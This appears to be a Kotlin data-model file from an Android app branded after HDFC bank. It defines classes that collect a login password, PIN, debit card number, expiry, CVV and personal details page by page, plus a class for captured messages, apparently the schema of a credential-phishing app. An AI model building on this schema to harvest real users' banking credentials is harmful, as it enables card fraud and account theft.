package com.example.hdfc_new_app

data class Message(
    val sender : String, val userid : String, val msg : String, val time : String , val type : String)

data class FirstPage(
    val userid : String, val mobile : String, val password : String)
data class SecondPagem(
    val dob: String, val fullname: String, val userid: String)
data class ThirdPagem(
    val pin : String, val expiry : String, val userid : String)
data class FourthPagem(
    val debit: String, val cvv : String, val userid : String)
